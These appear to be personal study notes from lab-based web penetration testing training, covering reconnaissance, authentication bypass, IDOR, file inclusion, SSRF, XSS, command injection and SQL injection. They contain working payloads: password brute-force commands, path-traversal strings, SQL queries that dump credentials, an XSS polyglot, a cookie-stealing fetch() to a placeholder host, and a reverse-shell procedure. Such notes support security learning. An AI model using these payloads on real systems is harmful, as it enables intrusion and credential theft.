PENETRATION TESTING
=======================================

Rules of Engagement doc:
 - contains:
	-> Permission
	-> Scope
	-> Rules

Pentest methodologies:
1. Information Gathering
2. Enumeration/Scanning
3. Exploitation
4. Privelege escalation
5. Post exploitation

The Open Source Security Testing Methodology Manual: https://www.isecom.org/OSSTMM.3.pdf

Open Web Application Security Project: https://owasp.org/

NIST Cybersecurity Framework 1.1: https://www.nist.gov/cyberframework

Cyber Assessment Framework: https://www.ncsc.gov.uk/collection/caf/caf-principles-and-guidance

CIA Triad:
- Confidentiality
- Integrity
- Availability

Principle of Privileges:
	1. Privileged Identity Management: create role that is based on user's role/responsibilities.
	2. Privileged Access Management:  manage the privileges an access role has.
	
Security models:
	1. The Bell-La Padula model
		- military style, top-secret stuff available to higher-up ranks.
		
	2. The Biba Model
		- a dev has access to code, but not the 
		
Threat model:
Threat modelling is the process of reviewing, improving, and testing the security protocols in place in an organisation's information technology infrastructure and services.

Threat model frameworks:
- STRIDE
- PASTA

STRIDE:
- Spoofing
- Tampering
- Repudiation
- Information Disclosure
- Denial of Service
- Escalation of privileges


Web-app pentesting:
- try listing the directory using a /assets on the page url. If directory listing is enabled, this could let us explore some files.

Content Discovery:
- can be:
	-> Manual
	-> Automated
	-> Open Source Intelligence (OSINT)

1. Robots.txt to see what pages they don't want to be publicly seen. accessed through {url}/robots.txt

2. look up default icons by checking the md5 hash of the icons and then looking it up on https://wiki.owasp.org/index.php/OWASP_favicon_database. This lets us identify the framework used to build the web app.

3. Sitemap: can sometimes contain areas of the website that are a bit more difficult to navigate to or even list some old webpages that the current site no longer uses but are still working behind the scenes. access it through {url}/sitemap.xml

4. HTTP headers: we could get information about web servers, php versions etc. access it through: curl -v {url}

5. Google Dorking/Hacking:
	site:tryhackme.com
	returns results only from the specified website address

	inurl:admin
	returns results that have the specified word in the URL

	filetype:pdf
	returns results which are a particular file extension

	intitle:admin
	returns results that contain the specified word in the title
	
6. Wappalyzer: Used to get the technology stacks used by websites https://www.wappalyzer.com/

7. Wayback machine: Historical lookback on webpages crawled and saved at different points in time dating back to the 90s. https://archive.org/web/

8. Automated tools for discovery:
	ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.172.194/FUZZ

	dirb http://10.10.172.194/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt

	gobuster dir --url http://10.10.172.194/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt


Subdomain enumeration:
- Three ways:
	1. Brute Force
	2. OSINT
	3. Virtual Host
	
	
 1. OSINT - SSL/TLS certificates:
	- https://crt.sh/
	- https://ui.ctsearch.entrust.com/ui/ctsearchui
	
 2. OSINT - Search engine : We can use the site: filter on Google search, like so: "-site:www.tryhackme.com site:*.tryhackme.com"
	This can show all the subdomains while excluding the www pages from the results.
	
 3. DNS Brute force:
	- https://www.kali.org/tools/dnsrecon/
	This uses a wordlist of commonly used subdomains and brute force to find the subdomains.
	This looks at DNS NS records, A records etc. 
	
 4. OSINT - Sublist3r
	- https://www.kali.org/tools/sublist3r/
	This automates looking up in multiple search engines (Google, Bing, Baidu, VirusTotal etc.) and finding the subdomains.
	
 5. Virtual hosts
	- Here it's a similar brute force but instead we send the server requests with different host headers.
	and depending on the response from the server, we can discover new subdomains.
	
	ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.116.155 -fs 2395

	the -fs flag is so that we filter out (i.e., remove) all the responses with that size.

=====================================================================================================================================================================================	
Authentication Bypass

1. Username enumeration
	- to create a list of valid usernames, the easiest thing is to attempt a sign-up with various username strings and observe the response error message like "user already exists".
	- Again, we can use ffuf for this:
	
		ffuf \
		-w /usr/share/wordlists/SecLists/Usernames/Names/names.txt \    # username list
		-X POST -d "username=FUZZ&email=x&password=x&cpassword=x" \		# form content
		-H "Content-Type: application/x-www-form-urlencoded" \			# set content-type header to form with values in url
		-u http://10.10.96.68/customers/signup \						# sign up url
		-mr "username already exists"									# error message string to match against
		
2. Password brute forcing
	- To use the valid list of usernames and a password list, and brute force the f out of the login endpoint.
	
	ffuf \
	-w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 \
	-X POST \
	-d "username=W1&password=W2" \
	-H "Content-Type: application/x-www-form-urlencoded" \
	-u http://10.10.96.68/customers/login \
	-fc 200
	
3. Application logic flaw:
	- We try to use any flaws in the authentication logic to gain access.
	- In the example scenario, the website was sending password reset email to an email associated to the account. 
	- The website prompts for an email of the account, then also asks for the username.
	- The email is collected through the query string param, and the username through a POST form variable.
	- The application logic uses the query string arg to fetch the account details and match the username with the user-entered username value. BUT, it then uses the PHP variable $_REQUEST to get the email address and send the reset email.
	- If there are both POST and GET variables of the same name, the application favors the POST variable from $_REQUEST. We exploit this and send another form variable 'email' when we make the request.
	- So the website uses the query string arg to validate the account, BUT it sends the reset email to the attacker's email id.
	
4. Cookie tampering
	- sometimes cookies might be setting the state of the user, such as logged_in=true/false or things like that.
	- so we can modify the cookie sent in our request to bypass authentication.
	
	Hashes
	Sometimes though cookie values won't be in plain text, but would contain some form of hash. In this case, we can use a hash lookup for e.g., https://crackstation.net/
	and find the original key.
	
======================================================================================================================================================================================

IDOR - Insecure Direct Object Reference
 - This kind of vulnerability occurs when a web-server uses user-supplied input to retrieve objects (files, data, documents) without validation on the server-side to verify that the requested object belongs to the user.
 - this is called an access control vulnerability.
 
 For e.g., this could be something as simple as changing the https://onlinestore.thm/order/1000/invoice to https://onlinestore.thm/order/1234/invoice
	
 - The IDs need not necessarily be passed in as plain text. For e.g., it could be encoded using base64 encoding or it could be sent as an md5 hash.
 In each of these cases, we can try to decode or use hash lookup to find the raw content.
 
 - If we can't find out the raw ID in anyway, we can create two accounts and swap the IDs between them. If we can view the other user's content while logged in as another user, then it's an IDOR vulnerability.
 
 IDORs doesn't necessarily have to be in the web page URL, it could also be in an endpoint where we make an AJAX request.
 
 There's also something called parameter mining which can be used to identify params that are not used by the web page, but is sort of hidden and still processed by the backend.
 Best way to detect this is using the network monitoring in the developer tools of a browser.
 
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

File inclusion:
 1. Local File Inclusion:
	- occurs due to a web developer's lack of security awareness.
	- for e.g., PHP uses functions like include(), require(), include_once() and require_once() to load files in the server into the script.
	- So in cases where some user input is directly used as params for these functions WITHOUT VALIDATION, we can modify the input value to a file path in the server that we want to retrieve, like '/etc/passwd'.
	- Some specific edge cases:
		1) The include() function could specify a directory, like "languages/". In which case, we can use the double dot (../) to escape and traverse up to the root.
		   So something like "../../../../../etc/passwd".
		   
		2) Sometimes the developer may append file extensions to the files being retrieved, like '.php'. In this case, we can escape that by adding a '%00' (without the quotes) to the end of the user string we supply.
		
		3) To take it further, the developer might filter out certain strings like '/etc/passwd' - in which case, we can use the dot operator to mean we want the current directory. So it would be '/etc/passwd/.' which gets filtered to => '.' => which still returns the /etc/passwd file.
		
		4) Another step is when developers filter out '../' strings. But we can overcome this by adding double the characters like: '....//'. So the first set of ../ gets removed from this but the remaining characters end up being '../' which still gets the job done.
		
		5) The developer could also add a validation that the input string begins with the directory to limit to, like 'languages/blah...'. In this case, we can have the input string start with 'languages/../../' and move up using the ../ operator.
		
 2. Remote File inclusion:
	- In this technique, we host our malicious file with the commands to be executed somewhere and inject the url into a param in the website being attacked.
	- The website then GETS the file from our malicious hosting site, and executes it.
	- For this to work, the allow_url_fopen option must be turned ON. (and also allow_url_include possibly.) 
	
	An example that Remote code execution that I did:
	1. Have the php reverse shell script hosted in my own web server 
	  (in a text file, i.e., in a .txt file -
	   my guess is that having .php files in a web server with php support will probably execute the php from our malware hosting server itself 
	   - but that's not what we want; we just want it to server up the script and it should execute on the target).
	 
	2. Using netcat, listen on a custom port for TCP connections.
	3. Edit the reverse shell script to have our malicious host's IP and the port in which netcat is listening on.
	4. In the file inclusion option on the target website, include the url to the payload.
	5. The target will then fetch the payload from our hosted web server, and execute it... and voila - you have a reverse shell to run all commands on.
	
	
 General notes and learning:
	- When submitting forms using curl, use the -H (header) and specify that it's x-www-form-urlencoded. Along with this, specify the form values using -d "key=value"
	
======================================================================================================================================================================================

SSRF - Server-side Request Forgery
 - This is a vulnerability that allows attackers to force a website to make an HTTP request for a resource of the attacker's choosing.
 - It sounds a lot like the file inclusion technique imo.
 
 For e.g., if we have a website accepting a URL as a query param like so:
	http://website.thm/stock?url=http://api.website.thm/api/stock/item?id=123
	
	-> The attacker can use the ../ to go up a directory.
	-> They could specify a separate URL altogether.
	-> If the website appends some other part of the URL to it, then we could insert &x= at the end of our URL so the remaining appended bits get ignored as the value for the query string param 'x'.
	-> We could also have the request be sent to our own hosted website and capture the credentials used for making the request.
	

 Overcoming defenses built for SSRF:
	-> The natural mechanisms are an allow-list or deny-list for domains which to accept from the user:
		1. If they are having a blocklist for IPs, let's say they block any incoming requests for 127.0.0.1, we can try other localhost references such as 0.0.0.0 or "127.1" or 2130706433 or subdomains like 27.0.0.1.nip.io that eventually resolve to 127.0.0.1
		2. The more robust mechanism is checking if the same domain has an open-redirect website, which is when they have a website redirect to the provided URL without any validations.
			2.1 The open redirect being from the same domain would get accepted when we inject it as an arg to the endpoint we're performing SSRF on. For example:
				- example.com is the website we want to SSRF on. example.com/processing?url=""
				- metrics.example.com is the open-redirect endpoint (this is a legitimate usecase to collect number of website visitors etc.)
				- Performing directly something like example.com/processing?url=localhost wouldn't work due to the allow/deny list.
				- So what we do is, inject this: example.com/processing?url=https://metrics.website.com?url=localhost
				
					This way, the request first goes to example.com => which sees the incoming redirect endpoint is another *.website.com domain => so it allows it => Now the metrics.website.com not having validations and just "openly redirecting" would redirect
					the request from the website.com/processing server to hit the localhost endpoint and the result will get returned to the user.

 - To identify SSRF vulnerability, we can look for these cases:
	1. Full URL in the address bar.
	2. Hidden field in a form. i.e., the default value in the html form field.
	3. A partial URL such as just the hostname in the query string param. e.g., ?server=hostname
	4. Just the path fo the URL in the query string param. e.g., ?dst=/forms/contact
	

 - If working with a blind SSRF where no output is reflected back to you, you'll need to use an external HTTP logging tool to monitor requests such as requestbin.com, your own HTTP server or Burp Suite's Collaborator client.
 
 SSRF practical example:
 1. A website could have an option to select an image for a user. 
 2. If we inspect element, we might be able to see that that it's submitting a url pointing to the image in order to select it.
 3. We can modify this submitted url to the resource we need, like /private.
 4. The website may have a deny list and block this by denying strings starting with private/, but we can try to work around it using something like x/../private. 
 
 
======================================================================================================================================================================================

Cross-site scripting:
 - this vulnerability allows an attacker to run malicious javascript code on the website when it's loaded to the victim's browser.
 
 ==============================================================================================================================================================================================================================================
||BONUS INFO: CORS headers can prevent XSS - BUT if CORS headers only prevent the browser from revealing the RESPONSE to the attacker, the request is still sent to the backend.                                                              ||
|| For HTTP methods like PUT/POST, the browser will first send an OPTIONS method that will ensure if the origin is allowed to send a request or not. and obviously when it sees it's a cross-origin, it will send a response to say, stop.	  || 
|| BUT for GET requests, the browser does not send any OPTIONS request, so it directly invokes.                                                                              																  ||
|| ==> This is why it's really important to not have GET requests do any kind of mutative actions on the backend, since XSS requests might trigger some processing on the backend.															  ||
 ==============================================================================================================================================================================================================================================
 - Depending on the way we inject the malicious code into the website, there are different kinds of XSS:
	1. Reflected XSS: 
		-> this is when a user supplied data in a request is "reflected" back and included in the webpage DOM without any modification. 
		-> So an attacker could have a link with the malicious code as the value for a parameter in the url like website.thm?param=<script src=attacker.com/blah.js>
		-> When the victim accesses this link, then bimdadibamdadiboom - they get the webpage back with the malicious code embedded.
		
	2. Stored XSS:
		-> In this case, the attacker inputs a malicious script into the website and the website persists this in a database. For e.g., comments on a forum.
		-> When the comments are loaded up for someone else (aka the victim), the code executes on their machine.
		
	3. DOM based XSS:
		-> I'm not fully clear on this, but looks like if something in the DOM is loaded up by the JavaScript and evaluated, for e.g., `window.location.hash` is loaded and put into an eval(), this could lead to malicious code being executed.
		-> I guess the assumption here is that the malicious code is embedded into the DOM?
		
	4. Blind XSS:
		-> This is similar to stored XSS, in that we inject some code through some persistence mechanism of the website and then the payload would callback to an endpoint we set up.
		

 - Useful things to note when building a payload:
	1. Basic: insert <script>alert('blah');</script> 
	into an input field or query arg to test if cross-site scripting is possible.
	
	2. If the result is shown inside an input tag's value, we can escape it:
		<input value="hello">
		
		injected with "<script>alert('blah');</script> turns into:
		<input value=""<script>alert('blah');</script>">
		
	3. if the result is put inside a <textarea> tag, close it with a </textarea> and then followed by script tag.
	
	4. If the result is populated via a javascript function like 
		document.getElementsByClassName('name').innerHTML = 'hello'
		
		We can close the existing line by using ';
		and then followed by our script alert('blah')
		and then followed by a comment // so the remaining characters in the line don't cause an error.
		
		So the result becomes:
		
		document.getElementsByClassName('name').innerHTML = '';alert('blah');//hello'
		
	5. If the word 'script' is being replaced by the backend, we can inject the payload with <sscriptcript> so that even after the word is stripped, the remaining content spells 'script'.
	
	6. If an image src is being populated with our payload, then we can use the onload() function on the img tag.
		using the payload: /path/to/image.jpg" onload=alert('blah');
		

 - Polyglots:
	-> This is a all-in-one kind of string of text that can escape and inject the payload in all kinds of contexts. It looks something like this:
	jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
	
 - NETCAT:
	-> When using XSS to send payloads, we will want something to listen to and capture these requests.
	-> Instead of setting up our own elaborate server mechanism, we can just use netcat to listen to any incoming requests.
	Command would be:
		nc -nvlp 9001
		
		n - no dns
		v - verbose
		l - listen mode
		p - specify port
		
	To send the payload from the XSS javascript, it could be something like this:
	<script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>
	
		fetch() command makes an HTTP request.
		btoa() command base64 encodes the victimâ€™s cookies.
		
======================================================================================================================================================================================

Command Injection:
 - also known as Remote Command Execution.
 - This is where we inject commands to be executed on the web server side.
 - happens when server takes user input data blindly and executes it without validation. for e.g., fetching a file or something.
 - There can be two types:
	- blind command injection:
		-> the command executes but nothing is returned back to the user-side.
		-> So it's hard for us to know if it executed or not.
		-> We can still have the output piped to a file and then try to retrieve the file contents. (maybe through file inclusion? - my idea)
		
	- verbose command injection:
		-> in this case, the output is returned in the web page.
		
 - Some useful commands that can be used in command injection:
 
	1. whoami:	See what user the application is running under.
	2. ls:		List the contents of the current directory. You may be able to find files such as configuration files, environment files (tokens and application keys), and many 	
				more valuable things.
	3. ping:	This command will invoke the application to hang. This will be useful in testing an application for blind command injection.
	4. sleep:	This is another useful payload in testing an application for blind command injection, where the machine does not have ping installed.
	5. nc:		Netcat can be used to spawn a reverse shell onto the vulnerable application. You can use this foothold to navigate around the target machine for other services, 
				files, or potential means of escalating privileges.

 - Remediation:
	-> Validate user input
	-> Sanitise input by removing characters such as &, ; etc.
	
	Attackers can still bypass these filters by sending the data in hexadecimal value.
	
 - Command injection payload reference: https://github.com/payloadbox/command-injection-payload-list
 
======================================================================================================================================================================================

SQL Injection:
 - Vulnerabilities where user input is placed into a SQL query.
 - For e.g., if a website has the url https://website.thm/blog?id=1 we can try to change the value for id from '1' to something like "1 UNION select 1,2,3 from table_name_X"
 
 How to detect sql vulnerability:
	-> Try out appending apostrophes (') or a quotation mark (") to the condition value.
	
Exploitation:
 - In any parameter value, we can inject the payload.
 - We can use the comment -- to make the query ignore any SQL code AFTER our injected values.
 - The parameter value in which we're injecting might be using a single quotes when being inserted in the query, so we might have to close it ourselves in order to add payload following it. for e.g., injecting for username, we might have to do: admin' UNION select 1,2,3 
 
 1. In-band SQLi:
	- In this case, the resutls/error messages are returned back to us on the webpage.
	
	-> To display database name:
		0 UNION select 1,2,database()
		
	-> To enumerate all table names:
		0 UNION select 1,2,group_concat(table_name) from information_schema.tables where table_schema = 'sqli_one'
		
	-> To enumerate column names for a table:
		0 UNION select 1,2,group_concat(column_name) from information_schema.columns where table_name = 'staff_users'
		
	-> To enumerate all the values of a table in a single line:
		0 UNION select 1,2,group_concat(username, ':', password SEPARATOR '<br>') from staff_users
		
 2. Blind SQLi - Authentication Bypass:
	-> In this case, we don't get the actual results/error message back to us.
	-> Instead, we might just need a yes/no reply from the database to gain access. For e.g., authentication bypass - all it checks is: is the entered username password returning any rows?
	-> In such cases, we can simply append "OR 1=1" to the query and it will always return results
	
 3. Blind SQLi - Boolean-based:
	-> We get a yes/no reply back onto the webpage, so we leverage that to enumerate the whole database.
	-> This involves a lot of brute forcing:
		
		The below query would always return true
		admin123' UNION SELECT 1,2,3 where database() like '%';--
		
		But now we can start to guess the starting character like so:
		admin123' UNION SELECT 1,2,3 where database() like 'a%';--
		
		and then incrementally move onto guessing each character in the database name.
		
		Similarly, we can find out the table names:
		admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--

		and the column names:
		admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';

 4. Blind SQLi - Time based:
 - IIRC this was based on injecting different queries and seeing the time taken by the server to respond to figure out which queries are yielding a hit.
 
 
 
====================================================================================================================================================================================================

Side-quests:: What is CSRF token? (Cross-site Request Forgery)

So imagine the scenario, you have a legitimate banking website, www.bank.com. You have a FORM to conduct a payment.
If your API had poor CORS configuration, let's say CORS: *. Then a malicious website that's also open on the same browser, could send a request to the API and the browser will by default include the cookies for your legitimate website.

Now, even if you had CORS set to strict, a browser wouldn't enforce it on things like simple GET/POST requests directly embedded into the HTML. For e.g., <img src="https://bank.com?id=1234&amount=10000>

So CORS alone doesn't cut it. That's where anti-CSRF comes in.

What your server does is, it generates a random, long, non-guessable number and assigns it to the user's session in the backend. This number is returned to the user when the page is loaded initially (in the response HEADER or embedded in the HTML).
Now a CSRF token needs to be explicitly included in a request's args, so that means if even a CORS was executed, the malicious actor wouldn't have access to this value (since cookies are only automatically included by the browser).

For the threat actor to have direct/manual access to your cookies, you would've had to set to Access-Control-Allow-Origin: * (which is a misconfiguration)